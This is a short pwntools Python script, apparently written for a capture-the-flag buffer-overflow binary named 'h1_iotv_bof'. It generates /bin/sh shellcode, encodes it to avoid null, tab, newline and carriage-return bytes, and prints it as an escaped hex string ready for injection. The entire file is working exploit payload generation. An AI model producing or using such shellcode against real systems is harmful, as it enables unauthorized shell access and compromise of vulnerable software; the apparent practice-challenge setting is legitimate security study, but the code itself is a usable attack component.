from pwn import *

context.binary = "./h1_iotv_bof"

pay = pwnlib.encoders.encode(asm(shellcraft.sh()), "\x00\x09\x0a\x0d")

ret = ""
for i in range(len(pay)):
  ret += "\\x" + hex(ord(pay[i]))[2:].rjust(2, "0")

print(ret)
